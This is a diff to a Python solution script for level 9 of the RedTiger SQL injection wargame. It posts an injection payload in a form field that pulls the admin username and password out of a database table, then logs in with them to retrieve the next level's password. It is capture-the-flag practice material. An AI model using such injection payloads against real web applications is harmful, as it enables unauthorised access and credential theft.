@@ -1,29 +1,31 @@
 #!/usr/bin/env python3
-import pickle
 import tigers as tg
 from bs4 import BeautifulSoup
 import re
 import tiger_cookies
-from connect import my_request as req
 
 
 def main():
-    '''
+    """
     Target: Get the password of the admin.
-    '''
+    """
     table_name = 'level9_users'
     url = "https://redtiger.labs.overthewire.org/level9.php"
     finds = ['username', 'password']  # What we are finding
     pass_r = 'The password for the next level is: '
     level = 'level9login'
+    method = 'post'
+    inj_param = 'text'
+    other_param = {'autor': '', 'title': '', 'post': 'Submit Query'}
 
     cooks = tiger_cookies.check_cookies(level)
     cook = dict(level9login=cooks[level])
 
     # Payload
-    data = dict(autor='', title='',
-                text="'), ((select username from level9_users limit 1), (select password from level9_users limit 1),'", post='Submit Query')
-    response = req.post_request(url, data, cook)
+    payload = "'), ((select username from level9_users limit 1), (select password from level9_users limit 1),'"
+    p = tg.SqlInjection(url, cook, method, inj_param, payload,
+                        check_clear=pass_r, other_param=other_param)
+    response = p.my_request()
 
     print(response)
 
@@ -35,12 +37,13 @@ def main():
     print(autor, title)
 
     # Authorization
-    data = dict(user=autor, password=title, login='Login')
-    response = req.post_request(url, data, cook)
+    other_param = {'user': autor, 'password': title, 'login': 'Login'}
+    p.inj_param = ''
+    p.other_param = other_param
+    response = p.my_request()
 
     # Еxtracting data from html
-    passw = tg.extract_pass(response, pass_r).replace(pass_r, '')
-    print('password:', passw)
+    passw = p.extract_pass(response)
     tiger_cookies.save_cookies(cooks, level, passw)
 
 
